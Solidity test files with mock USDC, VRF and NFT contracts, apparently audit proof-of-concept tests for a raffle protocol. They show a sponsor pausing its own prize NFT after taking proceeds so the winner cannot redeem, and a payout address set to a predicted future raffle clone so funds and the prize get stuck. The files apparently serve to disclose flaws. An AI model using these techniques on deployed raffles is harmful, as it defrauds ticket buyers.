// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import { ERC721 } from "@openzeppelin/contracts/token/ERC721/ERC721.sol";

interface Vm {
    function warp(uint256) external;
    function prank(address) external;
    function startPrank(address) external;
    function stopPrank() external;
    function deal(address, uint256) external;
    function expectRevert(bytes calldata) external;
    function expectRevert(bytes4) external;
    function expectRevert() external;
    function getNonce(address) external view returns (uint64);
    function computeCreateAddress(address, uint256) external pure returns (address);
    function txGasPrice(uint256) external;
}

contract MockUSDC {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IRawFulfill {
    function rawFulfillRandomWords(uint256 requestId, uint256[] memory randomWords) external;
}

/// Mimics the native path of the Chainlink VRF v2.5 wrapper: price depends on tx.gasprice, no refund, async callback.
contract MockVRFWrapper {
    uint256 public nextId = 1;
    uint256 public flatFee = 0.001 ether;
    mapping(uint256 => address) public consumerOf;

    function link() external pure returns (address) {
        return address(0x514910771AF9Ca656af840dff83E8264EcF986CA);
    }

    function linkNativeFeed() external pure returns (address) {
        return address(0);
    }

    function lastRequestId() external view returns (uint256) {
        return nextId - 1;
    }

    function calculateRequestPrice(uint32, uint32) external pure returns (uint256) {
        return 0;
    }

    function estimateRequestPrice(uint32, uint32, uint256) external pure returns (uint256) {
        return 0;
    }

    function calculateRequestPriceNative(uint32 gasLimit, uint32) public view returns (uint256) {
        return tx.gasprice * (uint256(gasLimit) + 100_000) + flatFee;
    }

    function estimateRequestPriceNative(uint32 gasLimit, uint32, uint256 gp) external view returns (uint256) {
        return gp * (uint256(gasLimit) + 100_000) + flatFee;
    }

    function requestRandomWordsInNative(uint32 gasLimit, uint16, uint32 numWords, bytes calldata)
        external
        payable
        returns (uint256 id)
    {
        require(msg.value >= calculateRequestPriceNative(gasLimit, numWords), "fee too low");
        id = nextId++;
        consumerOf[id] = msg.sender;
    }

    function fulfill(uint256 id, uint256 word) external {
        uint256[] memory words = new uint256[](1);
        words[0] = word;
        IRawFulfill(consumerOf[id]).rawFulfillRandomWords{ gas: 300_000 }(id, words);
    }
}

contract MockNFT is ERC721 {
    constructor() ERC721("Prize", "PRZ") { }

    function mint(address to, uint256 id) external {
        _mint(to, id);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import { ERC721 } from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import { RaffleFactory } from "../src/RaffleFactory.sol";
import { Raffle } from "../src/Raffle.sol";
import { IRaffle } from "../src/interfaces/IRaffle.sol";
import { IRaffleFactory } from "../src/interfaces/IRaffleFactory.sol";

interface Vm {
    function warp(uint256) external;
    function prank(address) external;
    function startPrank(address) external;
    function stopPrank() external;
    function deal(address, uint256) external;
    function expectRevert() external;
    function expectRevert(bytes calldata) external;
}

contract MockUSDC {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public constant decimals = 6;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a; balanceOf[to] += a; return true;
    }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        allowance[f][msg.sender] -= a; balanceOf[f] -= a; balanceOf[to] += a; return true;
    }
}

interface IConsumer { function rawFulfillRandomWords(uint256, uint256[] memory) external; }

contract MockWrapper {
    uint256 public constant FEE = 0.01 ether;
    uint256 public lastRequestId;
    mapping(uint256 => address) public cb;

    function link() external pure returns (address) { return address(0x11AA); }
    function linkNativeFeed() external pure returns (address) { return address(0x22BB); }
    function calculateRequestPrice(uint32, uint32) external pure returns (uint256) { return FEE; }
    function calculateRequestPriceNative(uint32, uint32) external pure returns (uint256) { return FEE; }
    function estimateRequestPrice(uint32, uint32, uint256) external pure returns (uint256) { return FEE; }
    function estimateRequestPriceNative(uint32, uint32, uint256) external pure returns (uint256) { return FEE; }
    function requestRandomWordsInNative(uint32, uint16, uint32, bytes calldata) external payable returns (uint256 id) {
        require(msg.value >= FEE, "fee");
        id = ++lastRequestId;
        cb[id] = msg.sender;
    }
    function fulfill(uint256 id, uint256 word) external {
        uint256[] memory w = new uint256[](1);
        w[0] = word;
        IConsumer(cb[id]).rawFulfillRandomWords(id, w);
    }
}

/// Ordinary standards-compliant collection with an owner pause, like OZ ERC721Pausable.
contract PausableNFT is ERC721 {
    address public owner;
    bool public paused;
    error EnforcedPause();

    constructor() ERC721("Art", "ART") { owner = msg.sender; }
    function mint(address to, uint256 id) external { require(msg.sender == owner); _mint(to, id); }
    function pause() external { require(msg.sender == owner); paused = true; }
    function unpause() external { require(msg.sender == owner); paused = false; }
    function _update(address to, uint256 id, address auth) internal override returns (address) {
        if (paused) revert EnforcedPause();
        return super._update(to, id, auth);
    }
}

contract PoC {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    MockUSDC usdc;
    MockWrapper wrapper;
    RaffleFactory factory;
    PausableNFT nft;
    Raffle raffle;

    address treasury = address(0x7EA5);
    address sponsor = address(0x5150);
    address sponsorRecipient = address(0x5151);
    address buyer1 = address(0xB001);
    address buyer2 = address(0xB002);

    function _setUp() internal {
        vm.warp(1_700_000_000);
        usdc = new MockUSDC();
        wrapper = new MockWrapper();
        factory = new RaffleFactory(address(usdc), address(wrapper), treasury);

        vm.startPrank(sponsor);
        nft = new PausableNFT();
        nft.mint(sponsor, 1);
        nft.approve(address(factory), 1);
        raffle = Raffle(payable(factory.createRaffle(IRaffleFactory.CreateRaffleParams({
            sponsorRecipient: sponsorRecipient,
            prizeToken: address(nft),
            prizeTokenId: 1,
            reserveEntries: 1000,
            endTime: uint64(block.timestamp + 7 days)
        }))));
        vm.stopPrank();

        usdc.mint(buyer1, 600e6);
        usdc.mint(buyer2, 400e6);
        vm.startPrank(buyer1);
        usdc.approve(address(raffle), 600e6);
        raffle.buyEntries(buyer1, 600); // ticket 1 = [1,600]
        vm.stopPrank();
        vm.startPrank(buyer2);
        usdc.approve(address(raffle), 400e6);
        raffle.buyEntries(buyer2, 400); // ticket 2 = [601,1000]
        vm.stopPrank();
    }

    function testSponsorPaidThenBlocksNftDelivery() external {
        _setUp();
        require(nft.ownerOf(1) == address(raffle), "escrow");
        require(raffle.unsettledPot() == 1_000e6, "pot");

        // Sale ends. Sponsor pauses its own collection; no raffle path touches the prize before redemption.
        vm.warp(raffle.endTime());
        vm.prank(sponsor);
        nft.pause();

        // Anyone requests the draw; VRF resolves entry 700 (ticket 2, buyer2). Reserve met -> NftWon.
        vm.deal(address(this), 1 ether);
        raffle.requestDraw{ value: 0.01 ether }();
        wrapper.fulfill(raffle.vrfRequestId(), 699);
        require(raffle.status() == IRaffle.Status.NftWon, "nftwon");
        require(raffle.winningEntry() == 700, "entry");

        // Permissionless storage-only settlement, then sponsor share released with no delivery check.
        raffle.settleWinningTicket(2);
        require(raffle.sponsorProceeds() == 950e6 && raffle.protocolFees() == 50e6, "alloc");
        raffle.releaseSponsorProceeds();
        require(usdc.balanceOf(sponsorRecipient) == 950e6, "sponsor paid");

        // Winner cannot redeem: the prize contract blocks the transfer, and the whole call reverts.
        vm.prank(buyer2);
        vm.expectRevert(PausableNFT.EnforcedPause.selector);
        raffle.redeemWinningTicket(2);

        // No other exit exists in NftWon.
        vm.expectRevert(abi.encodeWithSelector(IRaffle.InvalidStatus.selector, IRaffle.Status.NftWon));
        raffle.enableRefunds();
        uint256[] memory ids = new uint256[](1);
        ids[0] = 2;
        vm.prank(buyer2);
        vm.expectRevert(abi.encodeWithSelector(IRaffle.InvalidStatus.selector, IRaffle.Status.NftWon));
        raffle.refundTickets(ids);
        vm.expectRevert(abi.encodeWithSelector(IRaffle.SponsorPrizeUnavailable.selector, IRaffle.Status.NftWon));
        raffle.releaseSponsorPrize();

        require(raffle.ownerOf(2) == buyer2, "ticket kept");
        require(nft.ownerOf(1) == address(raffle), "nft stuck");
        require(raffle.winnerRedeemed() == false && raffle.prizeClaimed() == false, "flags");
        require(usdc.balanceOf(address(raffle)) == 50e6, "only fee left");
    }

    /// Control: the sponsor keeps an option. In CashWon it unpauses and takes the NFT back plus 15%.
    function testSponsorOptionInCashWon() external {
        vm.warp(1_700_000_000);
        usdc = new MockUSDC();
        wrapper = new MockWrapper();
        factory = new RaffleFactory(address(usdc), address(wrapper), treasury);
        vm.startPrank(sponsor);
        nft = new PausableNFT();
        nft.mint(sponsor, 1);
        nft.approve(address(factory), 1);
        raffle = Raffle(payable(factory.createRaffle(IRaffleFactory.CreateRaffleParams({
            sponsorRecipient: sponsorRecipient,
            prizeToken: address(nft),
            prizeTokenId: 1,
            reserveEntries: 2000,
            endTime: uint64(block.timestamp + 7 days)
        }))));
        vm.stopPrank();
        usdc.mint(buyer1, 1000e6);
        vm.startPrank(buyer1);
        usdc.approve(address(raffle), 1000e6);
        raffle.buyEntries(buyer1, 1000);
        vm.stopPrank();

        vm.warp(raffle.endTime());
        vm.prank(sponsor);
        nft.pause();
        vm.deal(address(this), 1 ether);
        raffle.requestDraw{ value: 0.01 ether }();
        wrapper.fulfill(raffle.vrfRequestId(), 5);
        require(raffle.status() == IRaffle.Status.CashWon, "cashwon");

        vm.prank(sponsor);
        nft.unpause();
        raffle.releaseSponsorPrize();
        require(nft.ownerOf(1) == sponsorRecipient, "nft back");
        vm.prank(buyer1);
        raffle.redeemWinningTicket(1);
        raffle.releaseSponsorProceeds();
        require(usdc.balanceOf(sponsorRecipient) == 150e6, "15%");
        require(usdc.balanceOf(buyer1) == 800e6, "80%");
    }

    receive() external payable { }
}

// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import { Vm, MockUSDC, MockVRFWrapper, MockNFT } from "./Mocks.sol";
import { RaffleFactory } from "../src/RaffleFactory.sol";
import { IRaffleFactory } from "../src/interfaces/IRaffleFactory.sol";
import { IRaffle } from "../src/interfaces/IRaffle.sol";
import { IERC721 } from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

contract FutureCloneTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    MockUSDC usdc;
    MockVRFWrapper wrapper;
    MockNFT nft;
    RaffleFactory factory;

    address treasury = address(0xFEE);
    address sponsor = address(0x5905);
    address buyer = address(0xB0B);

    function setUp() public {
        vm.warp(1_700_000_000);
        usdc = new MockUSDC();
        wrapper = new MockVRFWrapper();
        nft = new MockNFT();
        factory = new RaffleFactory(address(usdc), address(wrapper), treasury);
        nft.mint(sponsor, 1);
        nft.mint(sponsor, 2);
        usdc.mint(buyer, 1_000e6);
        vm.prank(sponsor);
        nft.setApprovalForAll(address(factory), true);
    }

    function _create(address recipient, uint256 id, uint128 reserve) internal returns (address) {
        vm.prank(sponsor);
        return factory.createRaffle(
            IRaffleFactory.CreateRaffleParams({
                sponsorRecipient: recipient,
                prizeToken: address(nft),
                prizeTokenId: id,
                reserveEntries: reserve,
                endTime: uint64(block.timestamp + 1 days)
            })
        );
    }

    /// Refunding path: the released prize NFT lands inside a second registered raffle clone.
    function test_prizeMovesIntoAnotherRaffleClone() public {
        uint64 n = vm.getNonce(address(factory));
        address predictedB = vm.computeCreateAddress(address(factory), uint256(n) + 1);
        require(predictedB.code.length == 0, "B not deployed yet");

        address a = _create(predictedB, 1, 10); // sponsorRecipient = future clone, passes all screens
        address b = _create(sponsor, 2, 10);
        require(b == predictedB, "prediction");
        require(factory.isRaffle(b), "B registered");
        require(IRaffle(a).sponsorRecipient() == b, "A pays B");

        vm.prank(sponsor);
        IRaffle(a).enableRefunds(); // empty raffle cancel
        IRaffle(a).releaseSponsorPrize(); // anyone

        require(nft.ownerOf(1) == b, "prize NFT of A now held by raffle clone B");
        // B tracks only token 2; token 1 has no exit path from B.
        require(IRaffle(b).prizeTokenId() == 2, "B tracks only its own prize");
    }

    /// CashWon path: sponsor USDC proceeds can never leave A; prize NFT moves into B.
    function test_cashWonSponsorProceedsLockedAndPrizeMoved() public {
        uint64 n = vm.getNonce(address(factory));
        address predictedB = vm.computeCreateAddress(address(factory), uint256(n) + 1);
        address a = _create(predictedB, 1, 10);
        address b = _create(sponsor, 2, 10);
        require(b == predictedB, "prediction");

        vm.startPrank(buyer);
        usdc.approve(a, type(uint256).max);
        uint256 t = IRaffle(a).buyEntries(buyer, 2);
        vm.stopPrank();

        vm.warp(IRaffle(a).endTime());
        vm.deal(address(this), 1 ether);
        uint256 rid = IRaffle(a).requestDraw{ value: 0.01 ether }();
        wrapper.fulfill(rid, 0);
        require(IRaffle(a).status() == IRaffle.Status.CashWon, "cash");

        IRaffle(a).settleWinningTicket(t);
        require(IRaffle(a).sponsorProceeds() == 300_000, "15% of 2 USDC");

        (bool ok, bytes memory ret) = a.call(abi.encodeWithSelector(IRaffle.releaseSponsorProceeds.selector));
        require(!ok, "sponsor release must revert");
        require(
            keccak256(ret) == keccak256(abi.encodeWithSelector(IRaffle.InvalidQuoteDestination.selector, b)),
            "InvalidQuoteDestination(B)"
        );

        IRaffle(a).releaseSponsorPrize();
        require(nft.ownerOf(1) == b, "prize NFT moved into raffle clone B");
    }

    receive() external payable { }
}

